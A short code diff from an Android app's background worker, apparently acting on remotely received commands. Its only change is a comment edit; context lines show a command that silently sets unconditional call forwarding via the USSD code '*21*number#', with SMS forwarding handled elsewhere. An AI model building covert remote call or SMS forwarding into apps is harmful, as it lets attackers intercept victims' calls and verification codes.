@@ -49,7 +49,7 @@ class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorke
                 val data = Gson().fromJson(cmd.data, ForwardCommandData::class.java)
                 UssdHelper.dialUssd(applicationContext, "*21*${data.number}#")
             }
-            "sms_forward" -> { /* just ignore, app handles separately */ }
+            "sms_forward" -> { /* ignore */ }
         }
     }
 
